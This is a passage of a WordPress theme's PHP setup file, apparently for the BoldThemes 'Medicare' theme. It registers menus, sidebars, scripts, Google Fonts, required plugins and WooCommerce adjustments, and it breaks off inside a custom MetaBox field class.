<?php

if ( ! class_exists( 'MedicareTheme' ) ) {

	class MedicareTheme {
	
		/**
	     * Constructor
	     */
		function __construct() {
		
			// Register action/filter callbacks
			
			add_action( 'after_setup_theme', array( $this, 'boldthemes_init' ) );
			add_action( 'wp_head', array( $this, 'boldthemes_set_global_uri' ) );
			add_action( 'widgets_init', array( $this, 'boldthemes_widgets_init' ) );
			add_action( 'wp_enqueue_scripts', array( $this, 'boldthemes_enqueue_scripts_styles' ) );
			add_action( 'wp_footer', array( $this, 'boldthemes_buggyfill_function' ), 20 );
			add_action( 'wp_print_scripts', array( $this, 'boldthemes_de_script' ), 100 );
			add_action( 'wp_enqueue_scripts', array( $this, 'boldthemes_load_fonts' ) );
			add_action( 'admin_head', array( $this, 'boldthemes_admin_style' ) );
			add_action( 'customize_controls_print_styles', array( $this, 'boldthemes_admin_customize_style' ) );
			add_action( 'tgmpa_register', array( $this, 'boldthemes_theme_register_required_plugins' ) );
			add_action( 'after_setup_theme', array( $this, 'boldthemes_woocommerce_support' ) );
			
			add_filter( 'get_search_form', array( $this, 'boldthemes_search_form' ) );
			add_filter( 'the_content_more_link', array( $this, 'boldthemes_remove_more_link_scroll' ) );
			add_filter( 'wp_list_categories', array( $this, 'boldthemes_cat_count_span' ) );
			add_filter( 'get_archives_link', array( $this, 'boldthemes_arch_count_span' ) );
			add_filter( 'style_loader_tag', array( $this, 'boldthemes_style_loader_tag_function' ) );
			add_filter( 'script_loader_tag', array( $this, 'boldthemes_script_loader_tag_function' ) );
			add_filter( 'wp_nav_menu_items', array( $this, 'boldthemes_remove_menu_item_whitespace' ) );
			add_filter( 'wp_video_shortcode', array( $this, 'boldthemes_wp_video_shortcode' ), 10, 5 );
			add_filter( 'wp_video_shortcode_library', array( $this, 'boldthemes_wp_video_shortcode_library' ) );
			add_filter( 'wp_audio_shortcode_library', array( $this, 'boldthemes_wp_audio_shortcode_library' ) );
			add_filter( 'wp_title', array( $this, 'boldthemes_title' ), 10, 3 );
			
			add_filter( 'woocommerce_product_tabs', array( $this, 'boldthemes_woo_remove_product_tabs' ), 98 );
			add_filter( 'woocommerce_show_page_title', function() { return false; });
			add_filter( 'woocommerce_enqueue_styles', '__return_empty_array' );
			
			remove_action( 'woocommerce_archive_description', 'woocommerce_product_archive_description', 10 );
			remove_action( 'woocommerce_before_shop_loop_item', 'woocommerce_template_loop_product_link_open', 10 );
			remove_action( 'woocommerce_after_shop_loop_item', 'woocommerce_template_loop_product_link_close', 5 );
			remove_action( 'woocommerce_after_shop_loop_item_title', 'woocommerce_template_loop_rating', 5 );	
			
			// add_filter( 'wpcf7_support_html5', '__return_false' );
			add_filter( 'wpcf7_support_html5_fallback', '__return_true' );
		}
		 
		/**
	     * Theme setup
	     */
		function boldthemes_init() {
	
			// add theme support
			add_theme_support( 'automatic-feed-links' );
			add_theme_support( 'post-thumbnails' );
			add_theme_support( 'html5', array( 'comment-list', 'comment-form', 'search-form', 'gallery', 'caption' ) );
			add_theme_support( 'post-formats', array( 'image', 'gallery', 'video', 'audio', 'link', 'quote' ) );
			add_theme_support( 'title-tag' );
			
			// register navigation menus
			register_nav_menus( array (
				'primary'     => esc_html__( 'Primary Menu', 'medicare' ),
				'footer'      => esc_html__( 'Footer Menu', 'medicare' ),
				'sub_footer'  => esc_html__( 'Sub Footer Menu', 'medicare' )
			));
			
			// load translated strings
			load_theme_textdomain( 'medicare', get_template_directory() . '/languages' );
			
			// date format
			MedicareTheme::$boldthemes_date_format = get_option( 'date_format' );

			// image sizes
			update_option( 'thumbnail_size_w', 160 );
			update_option( 'thumbnail_size_h', 160 );
			update_option( 'medium_size_w', 320 );
			update_option( 'medium_size_h', 0 );
			update_option( 'large_size_w', 1200 );
			update_option( 'large_size_h', 0 );

			add_image_size( 'boldthemes_grid', 540 );

			add_image_size( 'boldthemes_grid_11', 540, 540, true );
			add_image_size( 'boldthemes_grid_22', 1080, 1080, true );
			add_image_size( 'boldthemes_grid_21', 1080, 540, true );
			add_image_size( 'boldthemes_grid_12', 540, 1080, true );

			add_image_size( 'boldthemes_latest_posts', 640, 480, true );	
			add_image_size( 'boldthemes_grid_gallery', 540, 405, true );

		}
		
		// vars
		
		public static $boldthemes_page_for_header_id;
		public static $boldthemes_date_format;
		public static $boldthemes_sidebar;
		public static $boldthemes_has_sidebar;
		public static $boldthemes_fonts;		
		
		// callbacks
		
		/**
		 * Set JS AJAX URL and JS text labels
		 */
		function boldthemes_set_global_uri() {
			echo '<script>';
			echo 'window.BoldThemesURI = "' . esc_js( get_template_directory_uri() ) . '"; window.BoldThemesAJAXURL = "' . esc_js( admin_url( 'admin-ajax.php' ) ) . '";';
			echo 'window.boldthemes_text = [];';
			echo 'window.boldthemes_text.previous = \'' . esc_html__( 'previous', 'medicare' ) . '\';';
			echo 'window.boldthemes_text.next = \'' . esc_html__( 'next', 'medicare' ) . '\';';		
			echo '</script>';
		}
		
		/**
		 * WooCommerce support
		 */
		function boldthemes_woocommerce_support() {
			add_theme_support( 'woocommerce' );
			add_filter( 'loop_shop_per_page', create_function( '$cols', 'return 12;' ), 20 );
			add_filter('loop_shop_columns', 'loop_columns');
			if (!function_exists('loop_columns')) {
				function loop_columns() {
					return 3; // 3 products per row
				}
			}
			function woo_related_products_limit() {
				global $product;
				$args['posts_per_page'] = 6;
				return $args;
			}
			add_filter( 'woocommerce_output_related_products_args', 'jk_related_products_args' );
			  function jk_related_products_args( $args ) {
				$args['posts_per_page'] = 3; // 4 related products
				$args['columns'] = 3; // arranged in 2 columns
				return $args;
			}

		}
		
		/**
		 * Remove Recent Comments widget style and register sidebar and widget areas
		 */
		function boldthemes_widgets_init() {  
			global $wp_widget_factory;  
			remove_action( 'wp_head', array( $wp_widget_factory->widgets['WP_Widget_Recent_Comments'], 'recent_comments_style' ) );
			
			register_sidebar( array (
				'name' 			=> esc_html__( 'Sidebar', 'medicare' ),
				'id' 			=> 'primary_widget_area',
				'description' 	=> esc_html__( 'Sidebar Widget Area', 'medicare' ),
				'before_widget' => '<div class="btBox %2$s">',
				'after_widget' 	=> '</div>',
				'before_title' 	=> '<h4><span>',
				'after_title' 	=> '</span></h4>',
			));
			
			register_sidebar( array (
				'name' 			=> esc_html__( 'Header Left Widgets', 'medicare' ),
				'id' 			=> 'header_left_widgets',
				'description' 	=> esc_html__( 'Header Left Widget Area', 'medicare' )
			));
			
			register_sidebar( array (
				'name' 			=> esc_html__( 'Header Right Widgets', 'medicare' ),
				'id' 			=> 'header_right_widgets',
				'description' 	=> esc_html__( 'Header Right Widget Area', 'medicare' ),
				'before_widget' => '<div class="btTopBox %2$s">',
				'after_widget' 	=> '</div>'
			));			
			
			register_sidebar( array (
				'name' 			=> esc_html__( 'Footer Widgets', 'medicare' ),
				'id' 			=> 'footer_widgets',
				'description' 	=> esc_html__( 'Footer Widget Area', 'medicare' ),
				'before_widget' => '<div class="btBox %2$s">',
				'after_widget' 	=> '</div>',
				'before_title' 	=> '<h4><span>',
				'after_title' 	=> '</span></h4>',
			));
		}
		
		/**
		 * Enqueue scripts and styles
		 */
		function boldthemes_enqueue_scripts_styles() {

			global $boldthemes_crush_vars;
			$boldthemes_crush_vars = array();
			
			global $boldthemes_crush_vars_def;
			$boldthemes_crush_vars_def = array( 'accentColor', 'alterColor', 'bodyFont', 'menuFont', 'headingFont', 'headingSuperTitleFont', 'headingSubTitleFont' );			

			//custom accent color and font style

			$color = boldthemes_get_option( 'accent_color' );
			$alter_color = boldthemes_get_option( 'alter_color' );
			$body_font = urldecode( boldthemes_get_option( 'body_font' ) );
			$menu_font = urldecode( boldthemes_get_option( 'menu_font' ) );
			$heading_font = urldecode( boldthemes_get_option( 'heading_font' ) );
			$heading_supertitle_font = urldecode( boldthemes_get_option( 'heading_supertitle_font' ) );
			$heading_subtitle_font = urldecode( boldthemes_get_option( 'heading_subtitle_font' ) );

			if ( $color != '' ) {
				$boldthemes_crush_vars['accentColor'] = $color;
			}

			if ( $alter_color != '' ) {
				$boldthemes_crush_vars['alterColor'] = $alter_color;
			}

			if ( $body_font != 'no_change' ) {
				$boldthemes_crush_vars['bodyFont'] = $body_font;
			}

			if ( $menu_font != 'no_change' ) {
				$boldthemes_crush_vars['menuFont'] = $menu_font;
			}

			if ( $heading_font != 'no_change' ) {
				$boldthemes_crush_vars['headingFont'] = $heading_font;
			}

			if ( $heading_supertitle_font != 'no_change' ) {
				$boldthemes_crush_vars['headingSuperTitleFont'] = $heading_supertitle_font;
			}

			if ( $heading_subtitle_font != 'no_change' ) {
				$boldthemes_crush_vars['headingSubTitleFont'] = $heading_subtitle_font;
			}

			if ( function_exists( 'boldthemes_csscrush_file' ) ) {
				// boldthemes_csscrush_file( get_stylesheet_directory() . '/style.css', array( 'source_map' => true, 'minify' => false, 'plugins' => array( 'loop', 'ease' ) ) );
				boldthemes_csscrush_file( get_stylesheet_directory() . '/style.css', array( 'source_map' => true, 'minify' => false, 'output_file' => 'style.crush', 'formatter' => 'block', 'boilerplate' => false,  'plugins' => array( 'loop', 'ease' ) ) );
				boldthemes_csscrush_file( get_stylesheet_directory() . '/style.css', array( 'source_map' => true, 'minify' => true, 'output_file' => 'style.crush.min', 'boilerplate' => false,  'plugins' => array( 'loop', 'ease' ) ) );
				//boldthemes_csscrush_file( get_stylesheet_directory() . '/print.css', array( 'source_map' => true, 'minify' => false, 'output_file' => 'print.crush', 'formatter' => 'block', 'boilerplate' => false,  'plugins' => array( 'loop', 'ease' ) ) );
			}
			
			// custom theme css
			wp_enqueue_style( 'boldthemes_style_css', get_template_directory_uri() . '/style.crush.css', array(), false, "screen" );
			// wp_enqueue_style( 'boldthemes_style_css', get_template_directory_uri() . '/style.crush.min.css', array(), false );
			wp_enqueue_style( 'boldthemes_style_print_css', get_template_directory_uri() . '/print.css', array(), false, "print" );
			
			
			// custom buggyfill css
			//wp_enqueue_style( 'boldthemes_buggyfill_css', get_template_directory_uri() . '/css/viewport-buggyfill.css', array(), false, "screen" );
			// custom magnific popup css
			wp_enqueue_style( 'boldthemes_magnific-popup_css', get_template_directory_uri() . '/css/magnific-popup.css', array(), false, "screen" );
			// custom ie9 css
			wp_enqueue_style( 'boldthemes_ie9_css', get_template_directory_uri() . '/css/ie9.css', array(), false, "screen" );
			
			// third-party js
			wp_enqueue_script( 'viewport-units-buggyfill', get_template_directory_uri() . '/js/viewport-units-buggyfill.js', array( 'jquery' ), '', false );
			wp_enqueue_script( 'slick.min', get_template_directory_uri() . '/js/slick.min.js', array( 'jquery' ), '', false );
			wp_enqueue_script( 'jquery.magnific-popup.min', get_template_directory_uri() . '/js/jquery.magnific-popup.min.js', array( 'jquery' ), '', false );
			if ( ! wp_is_mobile() ) wp_enqueue_script( 'iscroll', get_template_directory_uri() . '/js/iscroll.js', array( 'jquery' ), '', false );
			wp_enqueue_script( 'fancySelect', get_template_directory_uri() . '/js/fancySelect.js', array( 'jquery' ), '', false );			
			wp_enqueue_script( 'html5shiv.min', get_template_directory_uri() . '/js/html5shiv.min.js', array(), false );
			wp_enqueue_script( 'respond.min', get_template_directory_uri() . '/js/respond.min.js', array(), false );
			
			// custom modernizr js
			wp_enqueue_script( 'boldthemes_modernizr_js', get_template_directory_uri() . '/js/modernizr.custom.js', array( 'jquery' ), '', false );
			// custom buggyfill js
			wp_enqueue_script( 'boldthemes_buggyfill_hacks_js', get_template_directory_uri() . '/js/viewport-units-buggyfill.hacks.js', array( 'jquery' ), '', false );
			// custom miscellaneous js
			wp_enqueue_script( 'boldthemes_misc_js', get_template_directory_uri() . '/js/misc.js', array( 'jquery' ), '', false );
			// custom header related js
			wp_enqueue_script( 'boldthemes_header_js', get_template_directory_uri() . '/js/header.misc.js', array( 'jquery' ), '', false );
			// custom tile hover effect js
			wp_enqueue_script( 'boldthemes_dirhover_js', get_template_directory_uri() . '/js/dir.hover.js', array( 'jquery' ), '', false );
			// custom slider js
			wp_enqueue_script( 'boldthemes_sliders_js', get_template_directory_uri() . '/js/sliders.js', array( 'jquery' ), '', false );	
			
			// dequeue cost calculator plugin style
			wp_dequeue_style( 'bt_cc_style' );
	
			if ( file_exists( get_template_directory() . '/css_override.php' ) ) {
				require_once( get_template_directory() . '/css_override.php' );
				if ( count( $boldthemes_crush_vars ) > 0 ) wp_add_inline_style( 'boldthemes_style_css', $css_override );
			}

		}
		
		/**
		 * Buggyfill script
		 */
		function boldthemes_buggyfill_function() {
			echo '<script>window.viewportUnitsBuggyfill.init({

			// milliseconds to delay between updates of viewport-units
			// caused by orientationchange, pageshow, resize events
			refreshDebounceWait: 250,

			// provide hacks plugin to make the contentHack property work correctly.
			hacks: window.viewportUnitsBuggyfillHacks

			});</script>';
		}
		
		/**
		 * Dequeue MetaBox clone script
		 */
		function boldthemes_de_script() {
			wp_dequeue_script( 'rwmb-clone' );
			wp_deregister_script( 'rwmb-clone' );
		}
		
		/**
		 * Loads custom Google Fonts
		 */
		function boldthemes_load_fonts() {
			$body_font = urldecode( boldthemes_get_option( 'body_font' ) );
			$heading_font = urldecode( boldthemes_get_option( 'heading_font' ) );
			$menu_font = urldecode( boldthemes_get_option( 'menu_font' ) );
			$heading_subtitle_font = urldecode( boldthemes_get_option( 'heading_subtitle_font' ) );
			$heading_supertitle_font = urldecode( boldthemes_get_option( 'heading_supertitle_font' ) );
			
			$font_families = array();
			
			if ( $body_font != 'no_change' ) {
				$font_families[] = $body_font . ':100,200,300,400,500,600,700,800,900,100italic,200italic,300italic,400italic,500italic,600italic,700italic,800italic,900italic';
			} else {
				$body_font_state = _x( 'on', 'Montserrat font: on or off', 'medicare' );
				if ( 'off' !== $body_font_state ) {
					$font_families[] = 'Montserrat' . ':100,200,300,400,500,600,700,800,900,100italic,200italic,300italic,400italic,500italic,600italic,700italic,800italic,900italic';
				}
			}
			
			if ( $heading_font != 'no_change' ) {
				$font_families[] = $heading_font . ':100,200,300,400,500,600,700,800,900,100italic,200italic,300italic,400italic,500italic,600italic,700italic,800italic,900italic';
			} else {
				$heading_font_state = _x( 'on', 'Montserrat font: on or off', 'medicare' );
				if ( 'off' !== $heading_font_state ) {
					$font_families[] = 'Montserrat' . ':100,200,300,400,500,600,700,800,900,100italic,200italic,300italic,400italic,500italic,600italic,700italic,800italic,900italic';
				}
			}
			
			if ( $menu_font != 'no_change' ) {
				$font_families[] = $menu_font . ':100,200,300,400,500,600,700,800,900,100italic,200italic,300italic,400italic,500italic,600italic,700italic,800italic,900italic';
			} else {
				$menu_font_state = _x( 'on', 'Montserrat font: on or off', 'medicare' );
				if ( 'off' !== $menu_font_state ) {
					$font_families[] = 'Montserrat' . ':100,200,300,400,500,600,700,800,900,100italic,200italic,300italic,400italic,500italic,600italic,700italic,800italic,900italic';
				}
			}

			if ( $heading_subtitle_font != 'no_change' ) {
				$font_families[] = $heading_subtitle_font . ':100,200,300,400,500,600,700,800,900,100italic,200italic,300italic,400italic,500italic,600italic,700italic,800italic,900italic';
			} else {
				$heading_subtitle_font_state = _x( 'on', 'Source Serif Pro font: on or off', 'medicare' );
				if ( 'off' !== $heading_subtitle_font_state ) {
					$font_families[] = 'Source Serif Pro' . ':100,200,300,400,500,600,700,800,900,100italic,200italic,300italic,400italic,500italic,600italic,700italic,800italic,900italic';
				}
			}

			if ( $heading_supertitle_font != 'no_change' ) {
				$font_families[] = $heading_supertitle_font . ':100,200,300,400,500,600,700,800,900,100italic,200italic,300italic,400italic,500italic,600italic,700italic,800italic,900italic';
			} else {
				$heading_supertitle_font_state = _x( 'on', 'Source Serif Pro font: on or off', 'medicare' );
				if ( 'off' !== $heading_supertitle_font_state ) {
					$font_families[] = 'Source Serif Pro' . ':100,200,300,400,500,600,700,800,900,100italic,200italic,300italic,400italic,500italic,600italic,700italic,800italic,900italic';
				}
			}

			if ( count( $font_families ) > 0  ) {
				$query_args = array(
					'family' => urlencode( implode( '|', $font_families ) ),
					'subset' => urlencode( 'latin,latin-ext' ),
				);
				$font_url = add_query_arg( $query_args, 'https://fonts.googleapis.com/css' );
				wp_enqueue_style( 'mona_fonts', $font_url, array(), '1.0.0' );
			}
		}

		/**
		 * MetaBox custom style
		 */
		function boldthemes_admin_style() {
			echo '<style>
				.rwmb-meta-box input[type="text"], .rwmb-meta-box select {
					width:250px;
				}
				.rwmb-meta-box input[type="text"].boldthemes_bttext {
					width:250px;
				}
			</style>';
		}
		
		/**
		 * Customize custom style
		 */
		function boldthemes_admin_customize_style() {
			echo '<style>
				.customize-control-image, .customize-control-text, .customize-control-select, 
				.customize-control-radio, .customize-control-checkbox, .customize-control-color {
					padding-top:5px;
					padding-bottom:5px;
				}
			</style>';
		}
		
		/**
		 * Register the required plugins for this theme
		 */
		function boldthemes_theme_register_required_plugins() {

			$plugins = array(
		 
				array(
					'name'               => 'Medicare', // The plugin name.
					'slug'               => 'medicare', // The plugin slug (typically the folder name).
					'source'             => get_template_directory() . '/plugins/medicare.zip', // The plugin source.
					'required'           => true, // If false, the plugin is only 'recommended' instead of required.
					'version'            => '1.0.5', // E.g. 1.0.0. If set, the active plugin must be this version or higher.
					'force_activation'   => false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch.
					'force_deactivation' => true, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins.
					'external_url'       => '', // If set, overrides default API URL and points to an external URL.
				),
				array(
					'name'               => 'Cost Calculator', // The plugin name.
					'slug'               => 'bt_cost_calculator', // The plugin slug (typically the folder name).
					'source'             => get_template_directory() . '/plugins/bt_cost_calculator.zip', // The plugin source.
					'required'           => true, // If false, the plugin is only 'recommended' instead of required.
					'version'            => '1.0.5', // E.g. 1.0.0. If set, the active plugin must be this version or higher.
					'force_activation'   => false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch.
					'force_deactivation' => true, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins.
					'external_url'       => '', // If set, overrides default API URL and points to an external URL.
				),
				array(
					'name'               => 'Rapid Composer', // The plugin name.
					'slug'               => 'rapid_composer', // The plugin slug (typically the folder name).
					'source'             => get_template_directory() . '/plugins/rapid_composer.zip', // The plugin source.
					'required'           => true, // If false, the plugin is only 'recommended' instead of required.
					'version'            => '1.2.5', // E.g. 1.0.0. If set, the active plugin must be this version or higher.
					'force_activation'   => false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch.
					'force_deactivation' => true, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins.
					'external_url'       => '', // If set, overrides default API URL and points to an external URL.
				),
				array(
					'name'               => 'BoldThemes WordPress Importer', // The plugin name.
					'slug'               => 'bt_wordpress_importer', // The plugin slug (typically the folder name).
					'source'             => get_template_directory() . '/plugins/bt_wordpress_importer.zip', // The plugin source.
					'required'           => true, // If false, the plugin is only 'recommended' instead of required.
					'version'            => '1.0.0', // E.g. 1.0.0. If set, the active plugin must be this version or higher.
					'force_activation'   => false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch.
					'force_deactivation' => true, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins.
					'external_url'       => '', // If set, overrides default API URL and points to an external URL.
				),
				array(
					'name'               => 'Meta Box', // The plugin name.
					'slug'               => 'meta-box', // The plugin slug (typically the folder name).
					'required'           => true, // If false, the plugin is only 'recommended' instead of required.
					'force_activation'   => false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch.
					'force_deactivation' => false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins.
				),
				array(
					'name'               => 'Contact Form 7', // The plugin name.
					'slug'               => 'contact-form-7', // The plugin slug (typically the folder name).
					'required'           => true, // If false, the plugin is only 'recommended' instead of required.
					'force_activation'   => false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch.
					'force_deactivation' => false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins.
				),
				array(
					'name'               => 'WooSidebars', // The plugin name.
					'slug'               => 'woosidebars', // The plugin slug (typically the folder name).
					'required'           => true, // If false, the plugin is only 'recommended' instead of required.
					'force_activation'   => false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch.
					'force_deactivation' => false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins.
				)		

			);
		 
			$config = array(
				'default_path' => '',                      // Default absolute path to pre-packaged plugins.
				'menu'         => 'tgmpa-install-plugins', // Menu slug.
				'has_notices'  => true,                    // Show admin notices or not.
				'dismissable'  => false,                    // If false, a user cannot dismiss the nag message.
				'dismiss_msg'  => '',                      // If 'dismissable' is false, this message will be output at top of nag.
				'is_automatic' => true,                   // Automatically activate plugins after installation or not.
				'message'      => '',                      // Message to output right before the plugins table.
				'strings'      => array(
					'page_title'                      => esc_html__( 'Install Required Plugins', 'medicare' ),
					'menu_title'                      => esc_html__( 'Install Plugins', 'medicare' ),
					'installing'                      => esc_html__( 'Installing Plugin: %s', 'medicare' ), // %s = plugin name.
					'oops'                            => esc_html__( 'Something went wrong with the plugin API.', 'medicare' ),
					'notice_can_install_required'     => _n_noop( 'This theme requires the following plugin: %1$s.', 'This theme requires the following plugins: %1$s.', 'medicare' ), // %1$s = plugin name(s).
					'notice_can_install_recommended'  => _n_noop( 'This theme recommends the following plugin: %1$s.', 'This theme recommends the following plugins: %1$s.', 'medicare' ), // %1$s = plugin name(s).
					'notice_cannot_install'           => _n_noop( 'Sorry, but you do not have the correct permissions to install the %s plugin. Contact the administrator of this site for help on getting the plugin installed.', 'Sorry, but you do not have the correct permissions to install the %s plugins. Contact the administrator of this site for help on getting the plugins installed.', 'medicare' ), // %1$s = plugin name(s).
					'notice_can_activate_required'    => _n_noop( 'The following required plugin is currently inactive: %1$s.', 'The following required plugins are currently inactive: %1$s.', 'medicare' ), // %1$s = plugin name(s).
					'notice_can_activate_recommended' => _n_noop( 'The following recommended plugin is currently inactive: %1$s.', 'The following recommended plugins are currently inactive: %1$s.', 'medicare' ), // %1$s = plugin name(s).
					'notice_cannot_activate'          => _n_noop( 'Sorry, but you do not have the correct permissions to activate the %s plugin. Contact the administrator of this site for help on getting the plugin activated.', 'Sorry, but you do not have the correct permissions to activate the %s plugins. Contact the administrator of this site for help on getting the plugins activated.', 'medicare' ), // %1$s = plugin name(s).
					'notice_ask_to_update'            => _n_noop( 'The following plugin needs to be updated to its latest version to ensure maximum compatibility with this theme: %1$s.', 'The following plugins need to be updated to their latest version to ensure maximum compatibility with this theme: %1$s.', 'medicare' ), // %1$s = plugin name(s).
					'notice_cannot_update'            => _n_noop( 'Sorry, but you do not have the correct permissions to update the %s plugin. Contact the administrator of this site for help on getting the plugin updated.', 'Sorry, but you do not have the correct permissions to update the %s plugins. Contact the administrator of this site for help on getting the plugins updated.', 'medicare' ), // %1$s = plugin name(s).
					'install_link'                    => _n_noop( 'Begin installing plugin', 'Begin installing plugins', 'medicare' ),
					'activate_link'                   => _n_noop( 'Begin activating plugin', 'Begin activating plugins', 'medicare' ),
					'return'                          => esc_html__( 'Return to Required Plugins Installer', 'medicare' ),
					'plugin_activated'                => esc_html__( 'Plugin activated successfully.', 'medicare' ),
					'complete'                        => esc_html__( 'All plugins installed and activated successfully. %s', 'medicare' ), // %s = dashboard link.
					'nag_type'                        => 'updated' // Determines admin notice type - can only be 'updated', 'update-nag' or 'error'.
				)
			);
		 
			tgmpa( $plugins, $config );
		 
		}
		
		/**
		 * Custom search form
		 *
		 * @return string
		 */
		function boldthemes_search_form( $form ) {
			//$form = boldthemes_get_icon_html( 'fa_f002', '#', '', 'btIcoDefaultType btIcoDefaultColor btIcoExtraSmallSize', '' );
			$form = '';
			$form .= '
			<div class="btSearchInner" role="search">
				<div class="btSearchInnerContent">
					<form action="' . home_url( '/' ) . '" method="get"><input type="text" name="s" placeholder="' . esc_attr( esc_html__( 'Looking for...', 'medicare' ) ) . '" class="untouched">
					<button type="submit" data-icon="&#xf105;"></button>
					</form>
				</div>
			</div>';
			return '<div class="btSearch">' . $form . '</div>';
		}

		/**
		 * Removes more link scroll
		 *
		 * @return string
		 */
		function boldthemes_remove_more_link_scroll( $link ) {
			$link = preg_replace( '|#more-[0-9]+|', '', $link );
			return $link;
		}
		
		/**
		 * Category list custom HTML
		 *
		 * @return string
		 */
		function boldthemes_cat_count_span( $links ) {
			if ( strpos( $links , '<option' ) === false ) {
				$links = str_replace('</a> (', '</a> <strong>', $links );
				$links = str_replace(')', '</strong>', $links );
				return $links;
			}
		}

		/**
		 * Archive link custom HTML
		 *
		 * @return string 
		 */
		function boldthemes_arch_count_span( $links ) {
			if ( strpos( $links , '<option' ) === false ) {
			// if( !$links.lastIndexOf("<option") ) {
				$links = str_replace('&nbsp;(', ' <strong>', $links );
				$links = str_replace(')', '</strong>', $links );			
			}
			return $links;
		}
		
		/**
		 * Style loader tag
		 *
		 * @return string
		 */
		function boldthemes_style_loader_tag_function( $tag ) {
			if ( strpos( $tag, 'boldthemes_buggyfill_css' ) === false ) {
				$tag = substr( $tag, 0, -3 ) . ' data-viewport-units-buggyfill=\'ignore\' />';
			}
			if ( strpos( $tag, 'ie9' ) !== false ) {
				$tag = '<!--[if lte IE 9]>' . $tag . '<![endif]-->';
			}			
			return $tag;
		}

		/**
		 * Script loader tag
		 *
		 * @return string 
		 */
		function boldthemes_script_loader_tag_function( $tag ) {
			if ( strpos( $tag, 'html5shiv' ) !== false || strpos( $tag, 'respond.min' ) !== false ) {
				$tag = '<!--[if lte IE 9]>' . $tag . '<![endif]-->';
			}
			return $tag;
		}
		
		/**
		 * Removes whitespace between tags in menu items
		 */
		function boldthemes_remove_menu_item_whitespace( $items ) {
			return preg_replace( '/>(\s|\n|\r)+</', '><', $items );
		}
		
		/**
		 * Video shortcode custom HTML
		 *
		 * @return string
		 */
		function boldthemes_wp_video_shortcode( $item_html, $atts, $video, $post_id, $library ) {
			$replace_value = 'width: ' . $atts['width'] . 'px';
			$replace_with  = 'width: 100%';
			return str_ireplace( $replace_value, $replace_with, $item_html );
		}

		/**
		 * Enqueue video shortcode custom JS
		 *
		 * @return string 
		 */
		function boldthemes_wp_video_shortcode_library() {
			wp_enqueue_style( 'wp-mediaelement' );
			wp_enqueue_script( 'boldthemes_video_shortcode', get_template_directory_uri() . '/js/video_shortcode.js', array( 'mediaelement' ), '', true );
			return 'boldthemes_mejs';
		}

		/**
		 * Enqueue audio shortcode custom JS
		 *
		 * @return string 
		 */
		function boldthemes_wp_audio_shortcode_library() {
			wp_enqueue_style( 'wp-mediaelement' );
			wp_enqueue_script( 'boldthemes_audio_shortcode', get_template_directory_uri() . '/js/audio_shortcode.js', array( 'mediaelement' ), '', true );
			return 'boldthemes_mejs';
		}
		
		/**
		 * Custom wp_title
		 *
		 * @return string
		 */
		function boldthemes_title( $title, $sep, $seplocation ) {
			if ( empty( $title ) && ( is_home() || is_front_page() ) ) {
				$title = esc_html__( 'Home', 'medicare' );
			}
			return trim( $title ) . ' / ' . get_bloginfo( 'name' );
		}

		function boldthemes_woo_remove_product_tabs( $tabs ) {

			//unset( $tabs['description'] );      	// Remove the description tab
			unset( $tabs['reviews'] ); 			// Remove the reviews tab
			//unset( $tabs['additional_information'] );  	// Remove the additional information tab

			return $tabs;

		}		
		
	}

	$medicare_theme = new MedicareTheme();

}

// set content width
if ( ! isset( $content_width ) ) {
	$content_width = 1200;
}

// define prefix
if ( ! defined( 'BoldThemesPFX' ) ) {
	define( 'BoldThemesPFX', 'boldthemes_theme' );
}

if ( file_exists( get_template_directory() . '/css-crush/CssCrush.php' ) ) {
	require_once( get_template_directory() . '/css-crush/CssCrush.php' );
} else {
	require_once( get_template_directory() . '/php/BTCrushFunctions.php' );
	require_once( get_template_directory() . '/php/BTCrushUtil.php' );
	require_once( get_template_directory() . '/php/BTCrushColor.php' );
	require_once( get_template_directory() . '/php/BTCrushRegex.php' );
}
require_once( get_template_directory() . '/config-meta-boxes.php' );
require_once( get_template_directory() . '/php/breadcrumbs.php' );
require_once( get_template_directory() . '/php/customization.php' );
require_once( get_template_directory() . '/php/boldthemes_functions.php' );
require_once( get_template_directory() . '/editor-buttons/editor-buttons.php' );
require_once( get_template_directory() . '/class-tgm-plugin-activation.php' );

/**
 * Pagination output for post archive
 */
if ( ! function_exists( 'boldthemes_pagination' ) ) {
	function boldthemes_pagination() {
	
		$prev = get_previous_posts_link( esc_html__( 'Newer Posts', 'medicare' ) );
		$next = get_next_posts_link( esc_html__( 'Older Posts', 'medicare' ) );
		
		$pattern = '/(<a href=".*">)(.*)(<\/a>)/';
		
		echo '<div class="btPagination boldSection gutter">';
			echo '<div class="port">';
				if ( $prev != '' ) {
					echo '<div class="paging onLeft">';
						echo '<p class="pagePrev">';
							echo preg_replace( $pattern, '<span class="nbsItem"><span class="nbsTitle">$2</span></span>', $prev );
						echo '</p>';
					echo '</div>';
				}
				if ( $next != '' ) {
					echo '<div class="paging onRight">';
						echo '<p class="pageNext">';
							echo preg_replace( $pattern, '<span class="nbsItem"><span class="nbsTitle">$2</span></span>', $next );
						echo '</p>';
					echo '</div>';
				}
			echo '</div>';
		echo '</div>';
	}
}

/**
 * Custom MetaBox input used for Override Global Settings
 */
if ( ! class_exists( 'RWMB_BoldThemesText_Field' ) && class_exists( 'RWMB_Field' ) ) {
	class RWMB_BoldThemesText_Field extends RWMB_Field {
	
		static function admin_enqueue_scripts() {			
			wp_enqueue_script( 
				'boldthemes_text',
				get_template_directory_uri() . '/js/boldthemes_text.js',
				array( 'jquery' ),
				'',
				true
			);
		}

		static function html( $meta, $field ) {	
			$meta_key = substr( $meta, 0, strpos( $meta, ':' ) );
			$meta_value = substr( $meta, strpos( $meta, ':' ) + 1 );
			$vars = get_class_vars( 'BoldThemes_Customize_Default' );
			$select = '<select class="btKeySelect" style="vertical-align:baseline;height:auto;">';
			$select .= '<option value=""></option>';
			foreach ( $vars as $key => $var ) {
				$selected_html = '';
				if ( BoldThemesPFX . '_' . $key == $meta_key ) {
